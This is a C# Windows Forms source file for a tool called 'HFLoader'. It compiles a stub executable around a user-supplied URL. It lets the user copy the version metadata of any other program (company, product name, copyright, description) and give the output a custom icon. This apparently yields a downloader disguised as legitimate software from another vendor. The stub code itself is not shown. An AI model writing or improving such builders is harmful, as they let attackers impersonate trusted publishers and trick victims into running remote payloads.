using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace HFLoader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void btn_Icon_Click(object sender, EventArgs e)
        {
            OpenFileDialog ico = new OpenFileDialog()
            {
                Filter = "Icon|*.ico",
                InitialDirectory = Environment.CurrentDirectory
            };
            if (ico.ShowDialog() == DialogResult.OK)
                pictureBox1.ImageLocation = ico.FileName;
        }

        private void btn_ClonePE_Click(object sender, EventArgs e)
        {
            OpenFileDialog AsInfo = new OpenFileDialog()
            {
                Filter = "PE Files|*.exe",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            };
            if (AsInfo.ShowDialog() == DialogResult.OK)
            {
                string AsPath = AsInfo.FileName;
                FileVersionInfo info = null;
                info = FileVersionInfo.GetVersionInfo(AsPath);

                Settings.AssemblyProductName = info.ProductName;
                Settings.AsseemblyCompany = info.CompanyName;
                Settings.AssemblyCopyright = info.LegalCopyright;
                Settings.AssemblyDescription = info.FileDescription;
                Settings.AssemblyProductVersion = info.ProductVersion;
                Settings.AssemblyFileVersion = info.FileVersion;

                Settings.AssemblyInfoChange = true;
            }
        }

        private void btn_Build_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog()
            {
                Filter = "Exe File|*.exe",
                InitialDirectory = Environment.CurrentDirectory
            };
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                Settings.Url = tb_Url.Text;
                string Source = Properties.Resources.DebugStub;

                #region File Info

                if (Settings.AssemblyInfoChange)
                {
                    Source = Source.Replace("%TITLE%", Settings.AssemblyProductName);
                    Source = Source.Replace("%DESCRIPTION%", Settings.AssemblyDescription);
                    Source = Source.Replace("%COMPANY%", Settings.AsseemblyCompany);
                    Source = Source.Replace("%PRODUCT%", Settings.AssemblyProductName);
                    Source = Source.Replace("%COPYRIGHT%", Settings.AssemblyCopyright);
                    Source = Source.Replace("%PRODUCTVERSION%", Settings.AssemblyProductVersion);
                    Source = Source.Replace("%FILEVERSION%", Settings.AssemblyFileVersion);
                }
                else
                {
                    Source = Source.Replace("%TITLE%", "");
                    Source = Source.Replace("%DESCRIPTION%", "");
                    Source = Source.Replace("%COMPANY%", "");
                    Source = Source.Replace("%PRODUCT%", "");
                    Source = Source.Replace("%COPYRIGHT%", "");
                    Source = Source.Replace("%PRODUCTVERSION%", "1.0.0.0");
                    Source = Source.Replace("%FILEVERSION%", "1.0.0.0");
                }

                #endregion

                #region Url

                Source = Source.Replace("%URLREPLACE%", Settings.Url);

                #endregion


               // File.WriteAllText(Environment.CurrentDirectory + "/Source.txt", Source);

                #region Compiler
                
                bool suc;
               
                if (File.Exists(pictureBox1.ImageLocation))
                {
                    suc = Compiler.CompileFromSource(Source, sfd.FileName, pictureBox1.ImageLocation);
                }
                else
                {
                    suc = Compiler.CompileFromSource(Source, sfd.FileName);
                }
               
                

                if (suc)
                    MessageBox.Show("Your file has been successfull created an is located under\n\n" + sfd.FileName, "Done",MessageBoxButtons.OK, MessageBoxIcon.Information);
                
                #endregion
            }
        }


    }
}
